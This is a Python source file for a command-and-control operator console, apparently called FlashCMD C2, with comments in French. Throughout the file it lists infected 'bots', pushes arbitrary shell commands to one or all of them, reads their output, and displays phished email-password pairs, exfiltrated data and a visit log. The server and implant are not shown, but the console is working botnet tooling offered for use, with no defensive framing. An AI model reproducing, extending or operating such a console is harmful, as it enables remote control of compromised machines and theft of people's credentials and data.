#!/usr/bin/env python3
"""
c2/c2_server.py — C2 CLI interactif
Usage : python c2/c2_server.py [server_url]
        ex : python c2/c2_server.py http://192.168.1.10:8080
"""
import sys, json, urllib.request, urllib.error, time

SERVER = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://localhost:8080"

def _get(path):
    try:
        with urllib.request.urlopen(f"{SERVER}{path}", timeout=8) as r:
            ct = r.headers.get("Content-Type","")
            raw = r.read()
            if "json" in ct:
                return json.loads(raw), raw.decode()
            return None, raw.decode()
    except urllib.error.HTTPError as e:
        print(f"  [HTTP {e.code}] {path}")
        return None, ""
    except Exception as e:
        print(f"  [ERR] {e}")
        return None, ""

def _post(path, data):
    try:
        payload = json.dumps(data).encode()
        req = urllib.request.Request(
            f"{SERVER}{path}", data=payload,
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        with urllib.request.urlopen(req, timeout=8) as r:
            return json.loads(r.read())
    except Exception as e:
        print(f"  [ERR] {e}")
        return {}

def list_bots():
    bots_data, _ = _get("/c2/bots")
    if not bots_data:
        print("  [aucun bot]")
        return
    print(f"\n  {'ID':<30} {'IP':<16} {'USER':<12} {'OS':<30} LAST SEEN")
    print("  " + "─"*95)
    for bid, info in bots_data.items():
        print(f"  {bid:<30} {info.get('ip','?'):<16} "
              f"{info.get('user','?'):<12} "
              f"{(info.get('os','?'))[:28]:<30} "
              f"{info.get('last_seen','?')[:19]}")
    print()

def show_results(bot_id):
    bots_data, _ = _get("/c2/bots")
    if not bots_data:
        return
    bot     = bots_data.get(bot_id, {})
    results = bot.get("results", [])
    if not results:
        print("  [aucun résultat]")
        return
    for r in results:
        print(f"\n  ── [{r.get('ts','?')}] ──")
        print(r.get("output",""))

def show_creds():
    _, raw = _get("/c2/creds")
    if not raw.strip() or raw.strip() == "(vide)":
        print("  [aucun credential]")
        return
    for line in raw.strip().split("\n"):
        try:
            e = json.loads(line)
            print(f"  [{e.get('ts','?')[:19]}] "
                  f"{e.get('ip','?'):<16} "
                  f"{e.get('email',''):<30} "
                  f"{e.get('password','')}")
        except Exception:
            print(f"  {line}")

def push_task(bot_id, cmd):
    r = _post(f"/c2/push/{bot_id}", {"cmd": cmd})
    if r.get("ok"):
        print(f"  ✓ commande envoyée à {bot_id}")
    else:
        print(f"  ✗ échec push")

def push_all(bots_dict, cmd):
    for bid in bots_dict:
        push_task(bid, cmd)
    print(f"  ✓ commande envoyée à {len(bots_dict)} bot(s)")

HELP = """
  Commandes disponibles :
  ─────────────────────────────────────────────────────
  bots               liste les bots connectés
  use <id>           sélectionner un bot
  push <cmd>         envoyer une commande au bot courant
  pushall <cmd>      envoyer une commande à TOUS les bots
  results            voir les résultats du bot courant
  creds              afficher les credentials phishés
  exfil              afficher les données exfiltrées
  visits             afficher le log des visites
  wait <n>           attendre n secondes puis relire les résultats
  clear              vider l'écran
  help               cette aide
  exit               quitter
  ─────────────────────────────────────────────────────
"""

print(f"\n{'='*56}")
print(f"  FlashCMD C2 — {SERVER}")
print(f"{'='*56}")
print(HELP)

current_bot  = None

try:
    import readline  # autocomplétion historique sur Linux/macOS
except ImportError:
    pass

while True:
    try:
        prompt = f"\n  c2/{current_bot or '?'}> "
        line   = input(prompt).strip()
        if not line:
            continue

        parts = line.split(None, 1)
        cmd   = parts[0].lower()
        args  = parts[1] if len(parts) > 1 else ""

        if cmd == "bots":
            list_bots()

        elif cmd == "use":
            current_bot = args.strip()
            print(f"  → ciblé : {current_bot}")

        elif cmd == "push":
            if not current_bot:
                print("  sélectionne un bot d'abord : use <id>")
            elif not args:
                print("  usage : push <commande>")
            else:
                push_task(current_bot, args)

        elif cmd == "pushall":
            if not args:
                print("  usage : pushall <commande>")
            else:
                bots_data, _ = _get("/c2/bots")
                if bots_data:
                    push_all(bots_data, args)

        elif cmd == "results":
            if not current_bot:
                print("  sélectionne un bot d'abord : use <id>")
            else:
                show_results(current_bot)

        elif cmd == "creds":
            show_creds()

        elif cmd == "exfil":
            _, raw = _get("/c2/exfil")
            print(raw or "  (vide)")

        elif cmd == "visits":
            _, raw = _get("/c2/visits")
            lines = (raw or "").strip().split("\n")[-30:]
            for l in lines:
                print(f"  {l}")

        elif cmd == "wait":
            n = int(args) if args.isdigit() else 5
            print(f"  attente {n}s…")
            time.sleep(n)
            if current_bot:
                show_results(current_bot)

        elif cmd == "clear":
            import os as _os
            _os.system("cls" if _os.name == "nt" else "clear")

        elif cmd in ("help", "?"):
            print(HELP)

        elif cmd in ("exit", "quit"):
            print("  [*] C2 fermé.")
            break

        else:
            # Si un bot est sélectionné, envoyer directement comme commande
            if current_bot:
                push_task(current_bot, line)
            else:
                print(f"  commande inconnue : {cmd}  (tape help)")

    except (KeyboardInterrupt, EOFError):
        print("\n  [*] C2 fermé.")
        break